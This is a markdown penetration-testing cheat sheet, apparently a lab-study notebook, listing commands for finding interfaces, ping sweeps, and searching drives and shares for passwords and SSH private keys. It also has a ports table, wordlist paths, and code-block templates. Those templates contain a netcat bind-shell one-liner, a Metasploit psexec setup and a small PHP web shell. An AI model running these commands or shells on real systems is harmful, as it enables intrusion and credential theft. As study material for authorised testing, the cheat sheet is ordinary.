# 🧠 General

This unholy scroll gathers essential one-liners and spectral commands — rites forged to uncover hidden paths to wordlists, summon critical data from the void, or inject precise strings into cursed systems. These are the foundational whispers you’ll return to when navigating the abyss of reconnaissance, enumeration, and interaction with ancient services.

---

<details>
<summary><h2>🌐 Get Network Interfaces</h2></summary>

<details>
<summary><h3>🪟 Windows</h3></summary>

<details>
<summary><h4>PowerShell</h4></summary>

List all IPv4 addresses with interface names (detailed)  

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
Get-NetIPAddress -AddressFamily IPv4 | Format-Table InterfaceAlias, IPAddress
```

</td>
</tr>
</table>



List interfaces with IPv4 addresses (filtered, concise)  


<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
Get-NetIPConfiguration | Where-Object { $_.IPv4Address } | Select-Object InterfaceAlias, @{n='IPv4';e={$_.IPv4Address.IPAddress}}
```

</td>
</tr>
</table>


</details>

<details>
<summary><h4>CMD</h4></summary>

REM Show all network configuration details



<table width="100%">
<tr>
<td colspan="2"> 📟 <b>CMD — Windows</b> </td>
</tr>
<tr>
<td width="20%">

**`C:\System32 >`**

</td>
<td>

```cmd
ipconfig /all
```

</td>
</tr>
</table>


REM Show only IPv4 addresses and adapter names

<table width="100%">
<tr>
<td colspan="2"> 📟 <b>CMD — Windows</b> </td>
</tr>
<tr>
<td width="20%">

**`C:\System32 >`**

</td>
<td>

```cmd
ipconfig /all | findstr /R /C:"IPv4 Address" /C:"adapter"
```

</td>
</tr>
</table>

</details>

</details>

<details>
<summary><h3>🐧 Linux</h3></summary>

Show all network interfaces and addresses (modern)

<table width="100%">
<tr>
<td colspan="2"> 🐧 <b>bash — Linux</b> </td>
</tr>
<tr>
<td width="20%">

**`user@linux:~$`**

</td>
<td>

```bash
ip addr
```

</td>
</tr>
</table>

One-line summary of all interfaces and addresses


<table width="100%">
<tr>
<td colspan="2"> 🐧 <b>bash — Linux</b> </td>
</tr>
<tr>
<td width="20%">

**`user@linux:~$`**

</td>
<td>

```bash
ip -o addr | awk -F ' +|/' '/inet/ {print $2, $4}'
```

</td>
</tr>
</table>

One-line summary of IPv4 addresses only


<table width="100%">
<tr>
<td colspan="2"> 🐧 <b>bash — Linux</b> </td>
</tr>
<tr>
<td width="20%">

**`user@linux:~$`**

</td>
<td>

```bash
ip -4 -o addr | awk -F ' +|/' '/inet/ {print $2, $4}'
```

</td>
</tr>
</table>


Legacy: Show all interfaces and IPv4 addresses

<table width="100%">
<tr>
<td colspan="2"> 🐧 <b>bash — Linux</b> </td>
</tr>
<tr>
<td width="20%">

**`user@linux:~$`**

</td>
<td>

```bash
ifconfig -a | grep -w inet | awk '{print $1, $2}'
```

</td>
</tr>
</table>

</details>

</details>

---

<details>
<summary><h2>📶 Ping Sweep</h2></summary>

**Ping Sweep For Loop on Linux Pivot Hosts**

<table width="100%">
<tr>
<td colspan="2"> 🐧 <b>bash — Linux</b> </td>
</tr>
<tr>
<td width="20%">

**`user@linux:~$`**

</td>
<td>

```bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

</td>
</tr>
<tr>
<td colspan="2">

---

```text
64 bytes from 172.16.5.19: icmp_seq=1 ttl=128 time=0.233 ms
64 bytes from 172.16.5.129: icmp_seq=1 ttl=64 time=0.030 ms
```

</td>
</tr>
</table>

**Ping Sweep For Loop Using CMD**

<table width="100%">
<tr>
<td colspan="2"> 📟 <b>CMD — Windows</b> </td>
</tr>
<tr>
<td width="20%">

**`C:\System32 >`**

</td>
<td>

```cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

</td>
</tr>
<tr>
<td colspan="2">

---

```text
...

ping 172.16.5.19 -n 1 -w 100   | find "Reply"
Reply from 172.16.5.19: bytes=32 time<1ms TTL=128

...

ping 172.16.5.129 -n 1 -w 100   | find "Reply"
Reply from 172.16.5.129: bytes=32 time<1ms TTL=64

...
```

</td>
</tr>
</table>

**Ping Sweep Using PowerShell**

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

</td>
</tr>
<tr>
<td colspan="2">

---

```text
...
172.16.5.18: False
172.16.5.19: True
172.16.5.20: False
...
172.16.5.128: False
172.16.5.129: True
172.16.5.130: False
...
```

</td>
</tr>
</table>

**Ping Sweep using Meterpreter**

<table width="100%">
<tr>
<td colspan="2"> 💣 <b>Metasploit — Linux - AttackHost</b> </td>
</tr>
<tr>
<td width="20%">

**`msf6 >`**

</td>
<td>

```
sessions -i 1
```

</td>
</tr>
<tr>
<td colspan="2">

---

```
[*] Starting interaction with 1...

(Meterpreter 1)(/home/ubuntu) > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
[*] Performing ping sweep for IP range 172.16.5.0/23

[+] 	172.16.5.19 host found
[+] 	172.16.5.129 host found
```

</td>
</tr>
</table>

> **NOTE:** It is possible that a ping sweep may not result in successful replies on the first attempt, especially when communicating across networks. This can be caused by the time it takes for a host to build its arp cache. In these cases, it is good to attempt our ping sweep at least twice to ensure the arp cache gets built.

If a host’s firewall blocks **ICMP**, a ping sweep will not provide useful results. In such cases, we can switch to a **TCP-based scan** of the **172.16.5.0/23** network using Nmap. This allows us to identify live hosts and open ports without relying on ICMP responses.

</details>

---

<details>
<summary><h2>🔍 Find</h2></summary>

<details>
<summary><h3>🪟 Windows</h3></summary>

<details>
<summary><h4>PowerShell</h4></summary>

Recursively find files named flag.txt and show full paths

<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
Get-ChildItem -Path C:\ -Recurse -Filter "flag.txt" -File -ErrorAction SilentlyContinue | Select-Object FullName
```

</td>
</tr>
</table>


Recursively search for the string “password” in config/text files and list file names


<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
Get-ChildItem -Path Y:\ -Recurse -Include *.txt,*.ini,*.cfg,*.config,*.xml,*.git,*.ps1,*.yml -File -ErrorAction SilentlyContinue |
    Select-String -Pattern "password" -List |
    Select-Object -ExpandProperty Path
```

</td>
</tr>
</table>

Recursively search for the string “password”, "passwd", "admin" and "creds" in xml/text files and list file names in multiple shares/drives


<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
Get-ChildItem -Path Y:\,X:\,Z:\,W:\,V:\,U:\ -Recurse -Include *.txt,*.xml -ErrorAction SilentlyContinue | Select-String -Pattern "password|passwd|admin|creds" -List | Select-Object -Unique Path
```

</td>
</tr>
</table>

Recursively search for the string “password” in ALL files and list file names


<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
Get-ChildItem -Path Z:\ -Recurse -Include *.* -File -ErrorAction SilentlyContinue |
    Select-String -Pattern "password" -List |
    Select-Object -ExpandProperty Path
```

</td>
</tr>
</table>

List all available shares


<table width="100%">
<tr>
<td colspan="2"> ⚡ <b>PowerShell — Windows</b> </td>
</tr>
<tr>
<td width="20%">

**`PS C:\Users\User >`**

</td>
<td>

```powershell
Get-SmbShare
```

</td>
</tr>
</table>

</details>

<details>
<summary><h4>CMD</h4></summary>

Recursively search for flag.txt in the current directory (including subdirectories)


<table width="100%">
<tr>
<td colspan="2"> 📟 <b>CMD — Windows</b> </td>
</tr>
<tr>
<td width="20%">

**`C:\System32 >`**

</td>
<td>

```cmd
dir flag.txt /S /P
```

</td>
</tr>
</table>


Recursively search all text and config files for the string “password” (case-insensitive)


<table width="100%">
<tr>
<td colspan="2"> 📟 <b>CMD — Windows</b> </td>
</tr>
<tr>
<td width="20%">

**`C:\System32 >`**

</td>
<td>

```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

</td>
</tr>
</table>


</details>
</details>

<details>
<summary><h3>🐧 Linux</h3></summary>

Recursively find files named flag.txt, suppress errors


<table width="100%">
<tr>
<td colspan="2"> 🐧 <b>bash — Linux</b> </td>
</tr>
<tr>
<td width="20%">

**`user@linux:~$`**

</td>
<td>

```bash
find / -type f -iname flag.txt 2>/dev/null
```

</td>
</tr>
</table>

Find files by extension


<table width="100%">
<tr>
<td colspan="2"> 🐧 <b>bash — Linux</b> </td>
</tr>
<tr>
<td width="20%">

**`user@linux:~$`**

</td>
<td>

```bash
for ext in $(echo ".txt .env .xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

</td>
</tr>
</table>

Find SSH Keys

<table width="100%">
<tr>
<td colspan="2"> 🐧 <b>bash — Linux</b> </td>
</tr>
<tr>
<td width="20%">

**`user@linux:~$`**

</td>
<td>

```bash
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
```

</td>
</tr>
</table>

</details>

</details>

---

<details>
<summary><h2>🚢 Common Ports</h2></summary>

| TCP Port | TCP Service                         | UDP Port | UDP Service            |
|----------|--------------------------------------|----------|-------------------------|
| 1        | tcpmux                               | 1        | N/A                     |
| 3        | CompressNET                          | 7        | Echo                    |
| 5        | RJE                                  | 9        | Discard                 |
| 7        | Echo                                 | 17       | QOTD                    |
| 9        | Discard                              | 19       | Chargen                 |
| 11       | SYSTAT                               | 37       | Time                    |
| 13       | Daytime                              | 49       | TACACS                  |
| 17       | QOTD                                 | 53       | DNS                     |
| 18       | Message Send Protocol                | 67       | DHCP Server             |
| 19       | Chargen                              | 68       | DHCP Client             |
| 20       | FTP Data                             | 69       | TFTP                    |
| 21       | FTP Control                          | 111      | RPCbind                 |
| 22       | SSH                                  | 123      | NTP                     |
| 23       | Telnet                               | 135      | MS RPC                  |
| 25       | SMTP                                 | 137      | NetBIOS Name Service    |
| 37       | Time                                 | 138      | NetBIOS Datagram        |
| 39       | RLP                                  | 161      | SNMP                    |
| 42       | WINS Replication                     | 162      | SNMP Trap               |
| 43       | WHOIS                                | 177      | XDMCP                   |
| 49       | TACACS                               | 500      | ISAKMP                  |
| 53       | DNS                                  | 514      | Syslog                  |
| 70       | Gopher                               | 520      | RIP                     |
| 79       | Finger                               | 631      | IPP                     |
| 80       | HTTP                                 | 1434     | MSSQL Monitor           |
| 88       | Kerberos                             | 1645     | RADIUS (alt)            |
| 109      | POP2                                 | 1646     | RADIUS Accounting       |
| 110      | POP3                                 | 1812     | RADIUS                  |
| 111      | RPCbind                              | 1813     | RADIUS Accounting       |
| 113      | Ident                                | 2049     | NFS                     |
| 119      | NNTP                                 | 2222     | DirectAdmin             |
| 123      | NTP                                  | 3306     | MySQL                   |
| 135      | MS RPC                               | 3456     | VAT                     |
| 139      | NetBIOS                              | 3702     | WS-Discovery            |
| 143      | IMAP                                 | 4500     | IPsec NAT-T             |
| 161      | SNMP                                 | 5353     | mDNS                    |
| 179      | BGP                                  | 5060     | SIP                     |
| 194      | IRC                                  | 5355     | LLMNR                   |
| 201      | AppleTalk                            | 6000     | X11                     |
| 220      | IMAP3                                | 10000    | Webmin                  |
| 389      | LDAP                                 | 17185    | Sounds Virtual          |
| 443      | HTTPS                                | 49152    | Windows RPC Dynamic     |
| 445      | SMB                                  |          |                         |
| 464      | Kerberos Change/Set Password         |          |                         |
| 465      | SMTPS                                |          |                         |
| 514      | Shell                                |          |                         |
| 515      | Printer                              |          |                         |
| 543      | Kerberos login                       |          |                         |
| 544      | Kerberos shell                       |          |                         |
| 548      | AFP                                  |          |                         |
| 554      | RTSP                                 |          |                         |
| 587      | SMTP Submission                      |          |                         |
| 631      | IPP                                  |          |                         |
| 636      | LDAPS                                |          |                         |
| 646      | LDP                                  |          |                         |
| 873      | rsync                                |          |                         |
| 990      | FTPS                                 |          |                         |
| 993      | IMAPS                                |          |                         |
| 995      | POP3S                                |          |                         |
| 1025     | Microsoft RPC                        |          |                         |
| 1080     | SOCKS                                |          |                         |
| 1194     | OpenVPN                              |          |                         |
| 1433     | MSSQL                                |          |                         |
| 1434     | MSSQL Monitor                        |          |                         |
| 1521     | Oracle DB                            |          |                         |
| 1723     | PPTP                                 |          |                         |
| 2049     | NFS                                  |          |                         |
| 2082     | cPanel                               |          |                         |
| 2083     | cPanel SSL                           |          |                         |
| 2100     | Oracle XDB                           |          |                         |
| 2483     | Oracle DB Listener                   |          |                         |
| 2484     | Oracle DB Listener SSL               |          |                         |
| 3128     | Squid Proxy                          |          |                         |
| 3306     | MySQL                                |          |                         |
| 3389     | RDP                                  |          |                         |
| 3690     | Subversion                           |          |                         |
| 4444     | Metasploit                           |          |                         |
| 4664     | Google Desktop                       |          |                         |
| 4899     | Radmin                               |          |                         |
| 5000     | UPnP                                 |          |                         |
| 5060     | SIP                                  |          |                         |
| 5432     | PostgreSQL                           |          |                         |
| 5500     | VNC                                  |          |                         |
| 5631     | pcAnywhere                           |          |                         |
| 5900     | VNC                                  |          |                         |
| 6000     | X11                                  |          |                         |
| 6667     | IRC                                  |          |                         |
| 7000     | AFS                                  |          |                         |
| 8000     | HTTP Alt                             |          |                         |
| 8080     | HTTP Proxy                           |          |                         |
| 8443     | HTTPS Alt                            |          |                         |
| 8888     | HTTP Alt                             |          |                         |
| 9100     | Printer                              |          |                         |
| 9999     | Abyss Web Server                     |          |                         |
| 10000    | Webmin                               |          |                         |
| 32768    | Windows RPC                          |          |                         |
| 49152    | Windows RPC Dynamic                  |          |                         |

</details>


---

<details>
<summary><h2>📝 Add host to /etc/hosts</h2></summary>

<table width="100%">
<tr>
<td colspan="2"> 🐧 <b>bash — Linux</b> </td>
</tr>
<tr>
<td width="20%">

**`user@linux:~$`**

</td>
<td>

```bash
echo "<IP> <DOMAIN>" | sudo tee -a /etc/hosts
```

</td>
</tr>
</table>

</details>

---

<details>
<summary><h2>📁 Folders</h2></summary>
  

<table width="100%">
<tr>
<td colspan="2"> 🐧 <b>bash — Linux</b> </td>
</tr>
<tr>
<td width="20%">

**`user@linux:~$`**

</td>
<td>

```bash
tree .
```

</td>
</tr>
</table>

</details>

---

<details>
<summary><h2>📋 Wordlists</h2></summary>

Unzip rockyou from SecLists


<table width="100%">
<tr>
<td colspan="2"> 🐧 <b>bash — Linux</b> </td>
</tr>
<tr>
<td width="20%">

**`user@linux:~$`**

</td>
<td>

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

</td>
</tr>
</table>


**SecLists Common Paths**

<table width="100%">
<tr>
<td> 📄 <b>Text — Wordlist Paths</b> </td>
</tr>
<tr>
<td>

```text
# APIs
/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Subdomains and VHOSTS
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Discovery/Web-Content/vhosts.txt

# Generic Files and Routes
/usr/share/wordlists/dirb/common.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
/usr/share/seclists/Discovery/Web-Content/Common-DB-Backups.txt
/usr/share/seclists/Discovery/Web-Content/Configuration-Files.txt
/usr/share/seclists/Discovery/Web-Content/Logs.txt

# Specific Technologies
/usr/share/seclists/Discovery/Web-Content/CMS/wordpress.txt
/usr/share/seclists/Discovery/Web-Content/jenkins.txt
/usr/share/seclists/Discovery/Web-Content/cloud-metadata.txt

# Users
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt

# Passwords
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
```

</td>
</tr>
</table>

</details>

---

<details>
<summary><h2>📃 Code Templates (VSCode Preview)</h2></summary>

| Prefix | Block | Theme | Comment Syntax |
|--------|-------|-------|----------------|
| `!ps` | PowerShell | Blue | `# ...` |
| `!cmd` | CMD Windows | Black | `REM ...` |
| `!bash` | Bash Linux | Gray | `# ...` |
| `!basha` | Bash AttackHost | Green | `# ...` |
| `!basht` | Bash Target | Blue | `# ...` |
| `!bashp` | Bash Pivot | Orange | `# ...` |
| `!msf` | Metasploit | Dark red | `# ...` |
| `!js` | JavaScript | Yellow | `// ...` |
| `!php` | PHP | Purple | `// ...` |
| `!ruby` | Ruby | Red | `# ...` |
| `!sql` | SQL | Cyan | `-- ...` |
| `!py` | Python | Blue/Yellow | `# ...` |
| `!txt` | Text/Output | Gray | *(none)* |
| `!note` | Note | Yellow | *(none)* |

<!-- POWERSHELL BLOCK -->
<div style="border:1px solid #224;border-radius:6px;overflow:hidden;font-family:Consolas,monospace;margin:8px 0;">
  <div style="background:#112;color:#C0C0C0;padding:4px 8px;font-size:13px;">
    🔵 PowerShell — <b>WS01</b>
  </div>
  <div style="background:#012456;color:#C0C0C0;padding:10px;white-space:pre;overflow-x:auto;">
Get-NetIPAddress -AddressFamily IPv4 | Format-Table InterfaceAlias, IPAddress
  </div>
</div>
<!-- END POWERSHELL BLOCK -->

<!-- CMD BLOCK -->
<div style="border:1px solid #333;border-radius:6px;overflow:hidden;font-family:Consolas,monospace;margin:8px 0;">
  <div style="background:#222;color:#fff;padding:4px 8px;font-size:13px;">
    🪟 CMD — <b>DC01</b>
  </div>
  <div style="background:#000;color:#fff;padding:10px;white-space:pre;overflow-x:auto;">
ipconfig /all
  </div>
</div>
<!-- END CMD BLOCK -->

<!-- BASH BLOCK -->
<div style="border:1px solid #3344aa;border-radius:6px;overflow:hidden;font-family:Consolas,monospace;margin:8px 0;">
  <div style="background:#001233;color:#aaccff;padding:4px 8px;font-size:13px;">
    🐧 bash — <b>Target</b>
  </div>
  <div style="background:#000b1a;color:#cce0ff;padding:10px;white-space:pre;overflow-x:auto;">
<span style="color:#666;"># Runs an nmap scan to discover ip addresses</span>
sudo nmap 10.129.2.0/24 -sn | grep for | cut -d" " -f5
  </div>
</div>
<!-- END BASH BLOCK -->

<!-- BASH BLOCK -->
<div style="border:1px solid #3a3;border-radius:6px;overflow:hidden;font-family:Consolas,monospace;margin:8px 0;">
  <div style="background:#0b270b;color:#9f9;padding:4px 8px;font-size:13px;">
    🐧 bash — <b>AttackHost</b>
  </div>
  <div style="background:#001a00;color:#0f0;padding:10px;white-space:pre;overflow-x:auto;">
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 4444 > /tmp/f
  </div>
</div>
<!-- END BASH BLOCK -->

<!-- BASH BLOCK -->
<div style="border:1px solid #dd4814 ;border-radius:6px;overflow:hidden;font-family:Consolas,monospace;margin:8px 0;">
  <div style="background:#611a00;color:#FFA500  ;padding:4px 8px;font-size:13px;">
    🐧 bash — <b>Pivot</b>
  </div>
  <div style="background: #2a0b00ff;color:#ccc;padding:10px;white-space:pre;overflow-x:auto;">
python2.7 client.py --server-ip 10.10.15.165 --server-port 9999
  </div>
</div>
<!-- END BASH BLOCK -->
<!-- BASH BLOCK -->
<div style="border:1px solid #555;border-radius:6px;overflow:hidden;font-family:Consolas,monospace;margin:8px 0;">
  <div style="background:#1b1b1b;color:#ddd;padding:4px 8px;font-size:13px;">
    🐧 bash — <b>Linux</b>
  </div>
  <div style="background:#0a0a0a;color:#ccc;padding:10px;white-space:pre;overflow-x:auto;">
tree .
  </div>
</div>
<!-- END BASH BLOCK -->

<!-- METASPLOIT BLOCK -->
<div style="border:1px solid #552222;border-radius:6px;overflow:hidden;font-family:Consolas,monospace;margin:8px 0;">
  <div style="background:#330000;color:#ff6666;padding:4px 8px;font-size:13px;">
    💀 Metasploit — <b>AttackHost</b>
  </div>
  <div style="background:#000;color:#f55;padding:10px;white-space:pre;overflow-x:auto;">
msfconsole
use exploit/windows/smb/psexec
set RHOSTS 10.10.10.5
set SMBUser Administrator
set SMBPass 'Summer2025!'
run
  </div>
</div>
<!-- END METASPLOIT BLOCK -->

<!-- JAVASCRIPT BLOCK -->
<div style="border:1px solid #444;border-radius:6px;overflow:hidden;font-family:Consolas,monospace;margin:8px 0;">
  <div style="background:#222;color:#f7df1e;padding:4px 8px;font-size:13px;">
    🟨 JavaScript — <b>PayloadGen</b>
  </div>
  <div style="background:#1a1a1a;color:#fce;padding:10px;white-space:pre;overflow-x:auto;">
fetch("http://target/login", {
  method: "POST",
  body: JSON.stringify({user:"admin",pass:"admin"})
});
  </div>
</div>
<!-- END JAVASCRIPT BLOCK -->

<!-- PHP BLOCK -->
<div style="border:1px solid #335;border-radius:6px;overflow:hidden;font-family:Consolas,monospace;margin:8px 0;">
  <div style="background:#2a2a55;color:#8899ff;padding:4px 8px;font-size:13px;">
    🟦 PHP — <b>WebShell</b>
  </div>
  <div style="background:#111122;color:#ccf;padding:10px;white-space:pre;overflow-x:auto;">
&lt;?php
echo shell_exec("whoami");
?&gt;
  </div>
</div>
<!-- END PHP BLOCK -->

<!-- RUBY BLOCK -->
<div style="border:1px solid #500;border-radius:6px;overflow:hidden;font-family:Consolas,monospace;margin:8px 0;">
  <div style="background:#300;color:#f44;padding:4px 8px;font-size:13px;">
    ❤️ Ruby — <b>ExploitScript</b>
  </div>
  <div style="background:#1a0000;color:#fbb;padding:10px;white-space:pre;overflow-x:auto;">
require 'socket'
s = TCPSocket.new("10.10.10.5", 80)
s.puts("GET / HTTP/1.1\r\nHost: test\r\n\r\n")
puts s.read
  </div>
</div>
<!-- END RUBY BLOCK -->

<!-- SQL BLOCK -->
<div style="border:1px solid #355;border-radius:6px;overflow:hidden;font-family:Consolas,monospace;margin:8px 0;">
  <div style="background:#022;color:#8ff;padding:4px 8px;font-size:13px;">
    🟩 SQL — <b>HR-DB</b>
  </div>
  <div style="background:#001b1b;color:#ccffff;padding:10px;white-space:pre;overflow-x:auto;">
SELECT username, last_login
FROM employees
WHERE role = 'manager';
  </div>
</div>
<!-- END SQL BLOCK -->

<!-- TXT BLOCK -->
<div style="border:1px solid #555;border-radius:6px;overflow:hidden;font-family:Consolas,monospace;margin:8px 0;">
  <div style="background:#444;color:#ddd;padding:4px 8px;font-size:13px;">
    📄 Text — <b>ScanOutput</b>
  </div>
  <div style="background:#222;color:#eee;padding:10px;white-space:pre;overflow-x:auto;">
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
445/tcp  open  microsoft-ds
  </div>
</div>
<!-- END TXT BLOCK -->



</details>

---

📘 **Next step:** Continue with [FOOTPRINTING](./01-footprinting.md)
